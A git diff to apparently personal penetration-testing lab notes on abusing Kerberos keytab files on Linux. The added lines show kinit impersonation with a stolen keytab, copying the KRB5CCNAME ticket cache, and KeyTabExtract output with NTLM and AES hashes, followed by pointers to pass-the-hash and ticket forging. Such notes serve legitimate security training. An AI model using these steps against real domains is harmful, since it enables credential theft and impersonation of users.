@@ -409,17 +409,41 @@ KRB5CCNAME=FILE:/tmp/...
 ```
 Each time a user logs in and authenticated via Kerberos, a cache file is created for them. If we have privileges to read the files (normally root) then we can impersonate any user that is authenticated.
 
-#### Abusing KeyTab Files
+#### Abusing KeyTab files
 ```sh
-# List information about a keytab file (incl. who it belongs too)
+# List information about a keytab file (incl. who it belongs too a.k.a the principle name)
 $ klist -k -t <keytab_file>
 
 # View current kerberos login information
 $ klist
 
 # Impersonate a different user
-#
+$ kinit <principle_name> -k -t <keytab_file>
+$ kinit julia@mydomain.com -k -t /home/julia/julia.keytab
 ```
+> To keep a copy of the ticket of the current user before we impersonate another user, we can make a copy of the file referenced in the `KRB5CCNAME` env var
+
+Whilst this method is good for accessing a resource, it will not give us the ability to take control of the account on the linux machine (we still require the password).
+#### Extracting secrets from KeyTab files
+We can extract the hashes from KeyTab files and attempt to crack the hash to get the user's password. [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) is a python tool for doing the extraction. It grabs the information from *502-type .keytab files*. It will get information such as the *realm*, *Service Principle*, *Encryption Type*, and *Hashes*.
+```sh
+$ python3 keytabextract.py /home/julia/julia.keytab
+
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : INLANEFREIGHT.HTB
+        SERVICE PRINCIPAL : carlos/
+        NTLM HASH : a738f...cce60
+        AES-256 HASH : 42ff...3007f
+        AES-128 HASH : fa74...61c4a
+```
+> We can perform:
+> - [[#Pass-the-Hash]] with the NTLM hash
+> - [[#Pass the Key or OverPass the Hash]] with the AES hashes to forge our own tickets
+> - Or crack the hashes to obtain the plaintext passwords
+> (KeyTab files can contain multiple credentials for multiple users, and/or different hash types)
 
 ### Pass the Key or OverPass the Hash
 Another way to obtain tickets is to forge them ourselves. By obtaining an NTLM hash or key (*rc4_hmac*, *aes256_cts_hmac_sha1*, etc) for a domain-joined user, we can convert it into a [[Kerberos#Ticket Granting Ticket (TGT)|TGT]].
